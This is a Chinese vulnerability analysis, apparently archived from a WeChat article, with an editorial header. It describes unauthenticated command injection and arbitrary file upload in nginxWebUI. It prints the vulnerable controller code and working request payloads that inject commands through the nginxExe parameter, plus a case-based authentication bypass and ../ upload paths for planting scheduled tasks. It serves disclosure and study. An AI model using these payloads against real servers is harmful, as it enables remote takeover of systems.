---
source: "MrWQ/vulnerability-paper"
title: "在野 0day nginxWebUI 远程代码执行漏洞 poc 补充"
product: "nginxWebUI"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "<3.5.2 unauthenticated via path case;later through3.6.0 authenticated per article;service filesystem rights"
source_url: "https://mp.weixin.qq.com/s/oKsR7bm3tleJIS675Qt0RA"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-abf220b51d80b5ba5e2f27b1"
entity_id: "ve-abf220b51d80b5ba5e2f27b1"
schema_version: "1"
---

# 在野 0day nginxWebUI 远程代码执行漏洞 poc 补充

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：<3.5.2 unauthenticated via path case;later through3.6.0 authenticated per article;service filesystem rights
- 证据范围：Distinct source-level expansion of2023 runCmd research;preserve several endpoints and tested platform differences

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 'All versions' explicitly only through article's3.6.0 cutoff;do not generalize to current versions
- Windows calc examples cannot establish Linux pipe/shell behavior through Runtime.exec
- POST example lacks blank separator and includes session despite pre-auth case path;clarify demonstration mode
- Uploads/config changes modify persistent state;cleanup/restoration omitted
- No exact later fixes/CVEs;do not merge all vectors into one endpoint entry

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oKsR7bm3tleJIS675Qt0RA)

一、漏洞描述
------

nginxWebUI 是一款图形化管理 nginx 配置的工具，能通过网页快速配置 nginx 的各种功能，包括 HTTP 和 TCP 协议转发、反向代理、负载均衡、静态 HTML 服务器以及 SSL 证书的自动申请、续签和配置，配置完成后可以一键生成 nginx.conf 文件，并控制 nginx 使用此文件进行启动和重载。 nginxWebUI 后台提供执行 nginx 相关命令的接口，由于未对用户的输入进行过滤，导致可在后台执行任意命令。并且该系统权限校验存在问题，导致存在权限绕过，在前台可直接调用后台接口，最终可以达到无条件远程命令执行的效果。

二、影响版本
------

nginxWebUI <3.5.2 未授权命令执行漏洞（网上公开为 3.5.0 但下载后发现作者已删除 GITEE 中 3.5.0 的相应代码，下载 3.5.0 版本 jar 包反编译后发现并没有对权限绕过进行修复） nginxWebUI 全版本均存在命令执行漏洞 (文章截止最新版 3.6.0)

三、漏洞详情
------

NginxWebUi 任意命令执行漏洞（一）中分析了`com.cym.controller.adminPage.ConfController#runCmd()`存在命令拼接导致任意命令执行漏洞，今天继续分析其余漏洞利用点

### 命令执行点 1

`com.cym.controller.adminPage.ConfController#reload()`方法

```
@Controller
@Mapping("/adminPage/conf")
public class ConfController extends BaseController {
    @Mapping(value = "reload")
    public synchronized JsonResult reload(String nginxPath, String nginxExe, String nginxDir) {
        //String nginxPath, String nginxExe, String nginxDir 为空则获取系统配置
        if (nginxPath == null) {
            nginxPath = settingService.get("nginxPath");
        }
        if (nginxExe == null) {
            nginxExe = settingService.get("nginxExe");
        }
        if (nginxDir == null) {
            nginxDir = settingService.get("nginxDir");
        }
        try {
            //命令拼接
            String cmd = nginxExe + " -s reload -c " + nginxPath;
            if (StrUtil.isNotEmpty(nginxDir)) {
                //命令拼接
                cmd += " -p " + nginxDir;
            }
            String rs = RuntimeUtil.execForStr(cmd);
            cmd = "<span class='blue'>" + cmd + "</span>";
            if (StrUtil.isEmpty(rs) || rs.contains("signal process started")) {
                return renderSuccess(cmd + "<br>" + m.get("confStr.reloadSuccess") + "<br>" + rs.replace("\n", "<br>"));
            } else {
                if (rs.contains("The system cannot find the file specified") || rs.contains("nginx.pid") || rs.contains("PID")) {
                    rs = rs + m.get("confStr.mayNotRun");
                }
                return renderSuccess(cmd + "<br>" + m.get("confStr.reloadFail") + "<br>" + rs.replace("\n", "<br>"));
            }
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
            return renderSuccess(m.get("confStr.reloadFail") + "<br>" + e.getMessage().replace("\n", "<br>"));
        }
    }
}

```

#### payload

```
http://localhost:8080/AdminPage/conf/reload?nginxExe=calc%20%7C

```

### 命令执行点 2

`com.cym.controller.adminPage.ConfController#check()`方法

```
@Controller
@Mapping("/adminPage/conf")
public class ConfController extends BaseController {
    @Mapping(value = "check")
    public JsonResult check(String nginxPath, String nginxExe, String nginxDir, String json) {
        if (nginxExe == null) {
            nginxExe = settingService.get("nginxExe");
        }
        if (nginxDir == null) {
            nginxDir = settingService.get("nginxDir");
        }
        JSONObject jsonObject = JSONUtil.parseObj(json);
        // json 中 nginxContent 不为空
        String nginxContent = Base64.decodeStr(jsonObject.getStr("nginxContent"), CharsetUtil.CHARSET_UTF_8);
        nginxContent = URLDecoder.decode(nginxContent, CharsetUtil.CHARSET_UTF_8).replace("<wave>", "~");
        //json 中 subContent 不为空 且为List
        List<String> subContent = jsonObject.getJSONArray("subContent").toList(String.class);
        for (int i = 0; i < subContent.size(); i++) {
            String content = Base64.decodeStr(subContent.get(i), CharsetUtil.CHARSET_UTF_8);
            content = URLDecoder.decode(content, CharsetUtil.CHARSET_UTF_8).replace("<wave>", "~");
            subContent.set(i, content);
        }
        // 替换分解域名include路径中的目标conf.d为temp/conf.d
        //nginxPath 不为空且可访问
        String confDir = ToolUtils.handlePath(new File(nginxPath).getParent()) + "/conf.d/";
        String tempDir = homeConfig.home + "temp" + "/conf.d/";
        //json 中 subName 不为空 且为List
        List<String> subName = jsonObject.getJSONArray("subName").toList(String.class);
        for (String sn : subName) {
            nginxContent = nginxContent.replace("include " + confDir + sn, //
                    "include " + tempDir + sn);
        }
        FileUtil.del(homeConfig.home + "temp");
        String fileTemp = homeConfig.home + "temp/nginx.conf";
        confService.replace(fileTemp, nginxContent, subContent, subName, false, null);
        String rs = null;
        String cmd = null;
        try {
            ClassPathResource resource = new ClassPathResource("mime.types");
            FileUtil.writeFromStream(resource.getStream(), homeConfig.home + "temp/mime.types");
            //
            cmd = nginxExe + " -t -c " + fileTemp;
            if (StrUtil.isNotEmpty(nginxDir)) {
                cmd += " -p " + nginxDir;
            }
            rs = RuntimeUtil.execForStr(cmd);
        } catch (Exception e) {
            logger.error(e.getMessage(), e);
            rs = e.getMessage().replace("\n", "<br>");
        }
        cmd = "<span class='blue'>" + cmd + "</span>";
        if (rs.contains("successful")) {
            return renderSuccess(cmd + "<br>" + m.get("confStr.verifySuccess") + "<br>" + rs.replace("\n", "<br>"));
        } else {
            return renderSuccess(cmd + "<br>" + m.get("confStr.verifyFail") + "<br>" + rs.replace("\n", "<br>"));
        }
    }
}

```

#### payload

```http
POST /AdminPage/conf/check HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 151
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: chrome-extension://ieoejemkppmjcdfbnfphhpbfmallhfnc
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SOLONID=1788f71299dc4608a355ff347bf429fa
Connection: close
nginxExe=calc%20%7C&json=%7B%22nginxContent%22%3A%22TES%22%2C%22subContent%22%3A%5B%22A%22%5D%2C%22subName%22%3A%5B%22A%22%5D%7D&nginxPath=C%3A%5CUsers

```

### 命令执行点 3

`com.cym.controller.adminPage.ConfController#checkBase()`方法，此方法从设置中获`nginxExe nginxDir`两个属性后拼接到命令在造成命令执行漏洞

```
@Mapping(value = "checkBase")
public JsonResult checkBase() {
    //从设置中获取  nginxExe  nginxDir
    String nginxExe = settingService.get("nginxExe");
    String nginxDir = settingService.get("nginxDir");
    String rs = null;
    String cmd = null;
    FileUtil.del(homeConfig.home + "temp");
    String fileTemp = homeConfig.home + "temp/nginx.conf";
    try {
        ConfExt confExt = confService.buildConf(false, true);
        FileUtil.writeString(confExt.getConf(), fileTemp, CharsetUtil.CHARSET_UTF_8);
        ClassPathResource resource = new ClassPathResource("mime.types");
        FileUtil.writeFromStream(resource.getStream(), homeConfig.home + "temp/mime.types");
        //命令拼接
        cmd = nginxExe + " -t -c " + fileTemp;
        if (StrUtil.isNotEmpty(nginxDir)) {
            cmd += " -p " + nginxDir;
        }
        //命令执行
        rs = RuntimeUtil.execForStr(cmd);
    } catch (Exception e) {
        logger.error(e.getMessage(), e);
        rs = e.getMessage().replace("\n", "<br>");
    }
    cmd = "<span class='blue'>" + cmd + "</span>";
    if (rs.contains("successful")) {
        return renderSuccess(cmd + "<br>" + m.get("confStr.verifySuccess") + "<br>" + rs.replace("\n", "<br>"));
    } else {
        return renderError(cmd + "<br>" + m.get("confStr.verifyFail") + "<br>" + rs.replace("\n", "<br>"));
    }
}

```

`com.cym.controller.adminPage.ConfController#saveCmd()`方法可设置以上属性

```
@Mapping(value = "saveCmd")
public JsonResult saveCmd(String nginxPath, String nginxExe, String nginxDir) {
    nginxPath = ToolUtils.handlePath(nginxPath);
    settingService.set("nginxPath", nginxPath);
    nginxExe = ToolUtils.handlePath(nginxExe);
    settingService.set("nginxExe", nginxExe);
    nginxDir = ToolUtils.handlePath(nginxDir);
    settingService.set("nginxDir", nginxDir);
    return renderSuccess();
}

```

#### payload

```
//第一步设置属性
http://localhost:8080/AdminPage/conf/saveCmd?nginxExe=calc%20%7c&nginxPath=a&nginxDir=a
//第二步执行命令
http://localhost:8080/AdminPage/conf/checkBase

```

### 任意文件上传 1

`com/cym/controller/adminPage/MainController.java`

```
    @Mapping("/adminPage/main/upload")
    public JsonResult upload(Context context, UploadedFile file) {
        try {
            File temp = new File(FileUtil.getTmpDir() + "/" + file.getName());
            file.transferTo(temp);
//            // 移动文件
//            File dest = new File(homeConfig.home + "cert/" + file.name);
//            while(FileUtil.exist(dest)) {
//                dest = new File(dest.getPath() + "_1");
//            }
//            FileUtil.move(temp, dest, true);
//            String localType = (String) context.session("localType");
//            if ("remote".equals(localType)) {
//                Remote remote = (Remote) context.session("remote");
//
//                HashMap<String, Object> paramMap = new HashMap<>();
//                paramMap.put("file", temp);
//
//                String rs = HttpUtil.post(remote.getProtocol() + "://" + remote.getIp() + ":" + remote.getPort() + "/upload", paramMap);
//                JsonResult jsonResult = JSONUtil.toBean(rs, JsonResult.class);
//                FileUtil.del(temp);
//                return jsonResult;
//            }
            return renderSuccess(temp.getPath().replace("\\", "/"));
        } catch (IllegalStateException | IOException e) {
            logger.error(e.getMessage(), e);
        }
        return renderError();
    }

```

可通过../ 控制文件上传路径，上传计划任务

### 任意文件上传 2

`com/cym/controller/adminPage/ServerController.java`

```
    @Mapping("upload")
    public JsonResult upload(Context context, UploadedFile file) {
        try {
            File temp = new File(FileUtil.getTmpDir() + "/" + file.getName());
            file.transferTo(temp);
            // 移动文件
            File dest = new File(homeConfig.home + "cert/" + file.getName());
            while(FileUtil.exist(dest)) {
                dest = new File(dest.getPath() + "_1");
            }
            FileUtil.move(temp, dest, true);
            String localType = (String) context.session("localType");
            if ("remote".equals(localType)) {
                Remote remote = (Remote) context.session("remote");
                HashMap<String, Object> paramMap = new HashMap<>();
                paramMap.put("file", temp);
                String rs = HttpUtil.post(remote.getProtocol() + "://" + remote.getIp() + ":" + remote.getPort() + "/upload", paramMap);
                JsonResult jsonResult = JSONUtil.toBean(rs, JsonResult.class);
                FileUtil.del(temp);
                return jsonResult;
            }
            return renderSuccess(dest.getPath().replace("\\", "/"));
        } catch (IllegalStateException | IOException e) {
            logger.error(e.getMessage(), e);
        }
        return renderError();
    }

```

可通过../ 控制文件上传路径，上传计划任务 

注：

以上漏洞点 3.5.2 以下均可通过大小写进行权限绕过，3.5.2 以上均需登陆后才可进行漏洞利用

如您有问题、建议、需求、合作、加群交流请后台留言或添加微信

![](../../.resource/remote/d4b4f0f2cdceb9d33813998cad46dafd467adc913269c25cdebed995f1e2e48e.jpg)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
